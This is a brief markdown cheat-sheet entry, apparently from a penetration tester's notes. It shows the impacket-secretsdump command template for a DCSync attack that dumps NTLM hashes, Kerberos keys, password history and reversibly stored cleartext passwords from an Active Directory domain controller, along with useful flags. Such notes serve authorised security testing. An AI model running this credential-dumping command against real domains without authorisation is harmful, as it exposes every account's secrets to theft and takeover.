---
tags:
  - linux
  - dcsync
---
```shell-session
$ impacket-secretsdump -outputfile <OUTPUT> -just-dc <DOMAIN>/<USER>@<DC-IP>
```
>The `<USER>` should have `DS-Replication-Get-Changes-All` permission assigned

This generates three files:
1. File with NTLM hashes
2. File with Kerberos Keys
3. Cleartext passwords from the NTDS if any account is set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.
# Useful Flags
- `-just-dc`: extracts NTLM hashes and Kerberos keys from the NTDS file
- `-just-dc-user`: to only extract data for a specific user
- `-pwd-last-set`: check last password change date
- `-history`: dump password history
- `-user-status`: to check whether a user is disabled or not

